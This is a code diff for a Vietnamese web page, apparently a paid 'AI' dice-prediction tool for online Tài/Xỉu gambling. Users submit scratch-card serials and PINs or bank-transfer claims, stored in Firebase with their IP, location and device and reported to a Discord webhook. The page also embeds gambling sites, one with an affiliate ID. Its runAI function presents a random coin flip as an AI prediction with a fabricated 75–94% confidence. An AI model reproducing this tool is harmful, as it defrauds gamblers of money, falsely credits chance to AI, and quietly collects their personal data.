+    const serial = document.getElementById('cardSerial').value.trim(); const pin = document.getElementById('cardPin').value.trim();
+    const msg = document.getElementById('depMsg');
+    if(!serial || !pin) { msg.className = 'msg err'; msg.classList.remove('hidden'); msg.innerText = "Nhập đủ Serial/PIN!"; return; }
 
-  function loadDeposits() {
-    const depList = document.getElementById('depList');
-    db.ref('deposits').on('value', snap => {
-      depList.innerHTML = "";
-      if(!snap.exists()) { depList.innerHTML = "<tr><td colspan='5' style='text-align:center;'>Chưa có đơn nào</td></tr>"; return; }
-      const arr = Object.keys(snap.val()).map(k => ({ id: k, ...snap.val()[k] })).sort((a,b)=>b.timestamp - a.timestamp);
-      arr.forEach(dep => {
-        const btn = dep.status === 'pending' ? `<button class="btn-g btn-sm" onclick="approveDeposit('${dep.id}')">Duyệt</button>` : '<span class="status-done">Đã duyệt</span>';
-        let amountNum = parseInt(dep.amount) || 0;
-        let info = dep.method === 'Thẻ Cào' ? `${dep.type} - ${amountNum.toLocaleString()}đ` : `Nội dung: ${dep.deviceCode} (${amountNum.toLocaleString()}đ)`;
-        depList.innerHTML += `<tr><td style="color:var(--gold); font-weight:bold;">${dep.deviceCode}</td><td>${dep.method}</td><td><b>IP:</b> ${dep.ip}<br><small style="color:#aaa;">${dep.location}</small></td><td>${info}</td><td>${btn}</td></tr>`;
-      });
-    });
+    db.ref('deposits').push().set({ method: 'Thẻ Cào', type: type, amount: amount, serial: serial, pin: pin, deviceCode: deviceCode, ip: deviceInfo.ip, location: deviceInfo.location, device: deviceInfo.device, time: new Date().toLocaleString('vi-VN'), status: 'pending', timestamp: Date.now() })
+    .then(() => {
+      msg.className = 'msg ok'; msg.classList.remove('hidden'); msg.innerText = "Đã gửi thẻ! Chờ Admin duyệt.";
+      document.getElementById('cardSerial').value = ""; document.getElementById('cardPin').value = "";
+      sendDiscordNotify("Nạp Thẻ", amount, `${type} - Seri: ${serial}`);
+    }).catch(e => { msg.className = 'msg err'; msg.classList.remove('hidden'); msg.innerText = "Lỗi Firebase: " + e.message; });
   }
 
-  function approveDeposit(id) {
-    if(!confirm("Xác nhận đã nhận được tiền và duyệt đơn này?")) return;
-    db.ref('deposits/' + id).once('value').then(snap => {
-      if(!snap.exists()) return;
-      let dep = snap.val();
-      if(dep.status !== 'pending') return;
-      let devCode = dep.deviceCode;
-      let amount = parseInt(dep.amount) || 0;
-      if(amount > 0 && devCode) {
-        db.ref('users/' + devCode + '/balance').transaction((currentBal) => { return (currentBal || 0) + amount; }, (error, committed, snapshot) => {
-          if (error) { alert("LỖI CỘNG TIỀN: " + error.message); } 
-          else if (committed) {
-            db.ref('deposits/' + id).update({ status: 'approved' }).then(() => {
-              fetch(DISCORD_WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ username: "Admin Hai×bo", embeds: [{ title: "✅ ĐÃ DUYỆT NẠP TIỀN!", color: 65280, description: `Đơn mã **${id}** đã cộng **${amount.toLocaleString()}đ** vào thiết bị **${devCode}**.`, timestamp: new Date().toISOString() }] }) });
-            });
-          }
-        });
-      } else { db.ref('deposits/' + id).update({ status: 'approved' }); }
-    });
+  function depositBank() {
+    if(!db) return;
+    const amount = parseInt(document.getElementById('bankAmount').value);
+    if(!amount || amount < 10000) { let m = document.getElementById('depMsg'); m.className = 'msg err'; m.classList.remove('hidden'); m.innerText = "Tối thiểu 10.000đ!"; return; }
+
+    db.ref('deposits').push().set({ method: 'Chuyển Khoản', amount: amount, deviceCode: deviceCode, ip: deviceInfo.ip, location: deviceInfo.location, device: deviceInfo.device, time: new Date().toLocaleString('vi-VN'), status: 'pending', timestamp: Date.now() })
+    .then(() => {
+      let m = document.getElementById('depMsg'); m.className = 'msg ok'; m.classList.remove('hidden'); m.innerText = "Đã ghi nhận! Chờ Admin check bill.";
+      document.getElementById('bankAmount').value = "";
+      sendDiscordNotify("Chuyển Khoản", amount, `Nội dung: ${deviceCode}`);
+    }).catch(e => { let m = document.getElementById('depMsg'); m.className = 'msg err'; m.classList.remove('hidden'); m.innerText = "Lỗi Firebase: " + e.message; });
+  }
+
+  function openGame(game) {
+    document.getElementById('mainApp').style.display = 'none'; document.getElementById('gameOverlay').style.display = 'flex'; document.getElementById('floatBtn').classList.remove('hidden');
+    const frame = document.getElementById('gameFrame');
+    if(game === 'sun') frame.src = "https://web.sunhot.win/?affId=Sunwin";
+    else if(game === 'b52') frame.src = "https://play.b52club.foo/?app_id=B52";
+    else if(game === 'lc79') frame.src = "https://play.lc79d.vin/";
+    else if(game === 'iwin') frame.src = "https://play.iwinclub.town/?a=258881e25885bd5a288b2a911f723a35";
+  }
+
+  function closeGame() {
+    document.getElementById('mainApp').style.display = 'block'; document.getElementById('gameOverlay').style.display = 'none';
+    document.getElementById('floatBtn').classList.add('hidden'); document.getElementById('toolBox').style.display = 'none';
+    document.getElementById('gameFrame').src = "about:blank"; isToolOpen = false;
+  }
+
+  function toggleTool() {
+    isToolOpen = !isToolOpen; document.getElementById('toolBox').style.display = isToolOpen ? 'block' : 'none';
+    if(isToolOpen) runAI();
+  }
+
+  function runAI() {
+    const tai = document.getElementById('lightTai'), xiu = document.getElementById('lightXiu'), aiStatus = document.getElementById('aiStatus');
+    tai.className = 'light red'; xiu.className = 'light green'; aiStatus.innerText = "AI: Đang quét..."; aiStatus.style.color = "#ffd700";
+    setTimeout(() => {
+      let predict = Math.random() < 0.5 ? "TAI" : "XIU", confidence = Math.floor(Math.random() * 20) + 75;
+      if(predict === "TAI") {
+        tai.classList.add('active-red'); aiStatus.innerText = `AI: TÀI (${confidence}%)`; aiStatus.style.color = "#ff3333";
+        setTimeout(() => { tai.classList.remove('active-red'); }, 1600);
+      } else {
+        xiu.classList.add('active-green'); aiStatus.innerText = `AI: XỈU (${confidence}%)`; aiStatus.style.color = "#00e676";
+        setTimeout(() => { xiu.classList.remove('active-green'); }, 1600);
+      }
+    }, 1000); 
   }
 </script>
 </body>
